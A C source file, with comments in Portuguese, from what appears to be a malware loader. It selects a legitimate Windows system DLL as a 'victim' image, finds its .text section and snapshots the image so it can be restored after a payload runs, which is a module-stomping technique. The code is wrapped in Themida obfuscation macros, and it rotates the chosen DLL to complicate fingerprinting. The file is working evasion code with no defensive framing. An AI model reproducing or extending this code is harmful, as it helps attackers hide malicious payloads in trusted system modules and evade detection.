/* stub_victim.c — escolha runtime de DLL vítima. */
#include "stub_victim.h"
#include "ThemidaSDK.h"
#include <string.h>

extern void WriteLogFile(const char* msg);

/* Lista rotativa.  Ordem importa pouco (rotação fica a cargo do build via
 * shuffle pré-link, ou dinâmica abaixo via tickCount). */
static const wchar_t* k_candidates[] = {
    L"wlanapi.dll",
    L"dot3api.dll",
    L"mfplat.dll",
    L"winmm.dll",
    L"msdmo.dll",
    L"dsound.dll",
    NULL
};

/* Coleta baseVA, sizeOfImage e .text VA/size de uma DLL já carregada.
 * Retorna FALSE se a DLL parecer malformada. */
static BOOL inspect_loaded_module(HMODULE hMod,
                                  BYTE** outBase, DWORD* outImageSize,
                                  BYTE** outText, DWORD* outTextSize) {
    BYTE* base = (BYTE*)hMod;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    *outBase      = base;
    *outImageSize = nt->OptionalHeader.SizeOfImage;
    *outText      = NULL;
    *outTextSize  = 0;
    IMAGE_SECTION_HEADER* sects = (IMAGE_SECTION_HEADER*)
        ((BYTE*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sects[i].Name, ".text", 5) == 0) {
            *outText = base + sects[i].VirtualAddress;
            *outTextSize = sects[i].Misc.VirtualSize ? sects[i].Misc.VirtualSize
                                                     : sects[i].SizeOfRawData;
            break;
        }
    }
    return (*outText != NULL);
}

/* Verifica se a DLL tem TLS callbacks (rejeitamos — interfere com nosso entrypoint). */
static BOOL has_tls_callbacks(HMODULE hMod) {
    BYTE* base = (BYTE*)hMod;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tlsDir->Size == 0 || tlsDir->VirtualAddress == 0) return FALSE;
    IMAGE_TLS_DIRECTORY64* tls = (IMAGE_TLS_DIRECTORY64*)(base + tlsDir->VirtualAddress);
    /* AddressOfCallBacks aponta para um array null-terminated em VA absoluto */
    if (tls->AddressOfCallBacks == 0) return FALSE;
    PIMAGE_TLS_CALLBACK* cbs = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
    return (cbs[0] != NULL);
}

int StubVictim_Pick(StubVictim* out, DWORD minImageSize) {
    MUTATE_START
    int rc_out = -1;
    if (!out) { rc_out = -3; goto done; }
    memset(out, 0, sizeof(*out));

    /* Rotação determinística por sessão para complicar fingerprint. */
    DWORD seed = GetTickCount() ^ GetCurrentProcessId();
    int n = 0;
    while (k_candidates[n]) n++;
    int start = (int)(seed % (DWORD)n);

    for (int step = 0; step < n; step++) {
        const wchar_t* name = k_candidates[(start + step) % n];

        /* P3.6 alinhado: SEARCH_SYSTEM32 only — impede side-load. */
        HMODULE hMod = LoadLibraryExW(name, NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
        if (!hMod) continue;

        BYTE* base = NULL; DWORD imageSize = 0;
        BYTE* textVA = NULL; DWORD textSize = 0;
        if (!inspect_loaded_module(hMod, &base, &imageSize, &textVA, &textSize)) {
            FreeLibrary(hMod); continue;
        }
        if (imageSize < minImageSize) {
            FreeLibrary(hMod); continue;
        }
        if (has_tls_callbacks(hMod)) {
            FreeLibrary(hMod); continue;
        }

        /* Snapshot da imagem inteira para revert pós-PayloadMain. */
        BYTE* snap = (BYTE*)HeapAlloc(GetProcessHeap(), 0, imageSize);
        if (!snap) { FreeLibrary(hMod); return -3; }
        memcpy(snap, base, imageSize);

        out->hMod        = hMod;
        out->baseVA      = base;
        out->sizeOfImage = imageSize;
        out->textVA      = textVA;
        out->textSize    = textSize;
        out->snapshot    = snap;
        out->snapshotLen = imageSize;
        GetModuleFileNameW(hMod, out->path, MAX_PATH);

        char log[128];
        wsprintfA(log, "Victim picked: image=%lu need=%lu", imageSize, minImageSize);
        WriteLogFile(log);
        rc_out = 0;
        goto done;
    }
    WriteLogFile("StubVictim_Pick: no candidate fits");
    rc_out = (minImageSize > 0) ? -2 : -1;

done:
    MUTATE_END
    return rc_out;
}

void StubVictim_FreeSnapshot(StubVictim* v) {
    if (!v || !v->snapshot) return;
    RtlSecureZeroMemory(v->snapshot, v->snapshotLen);
    HeapFree(GetProcessHeap(), 0, v->snapshot);
    v->snapshot = NULL;
    v->snapshotLen = 0;
}
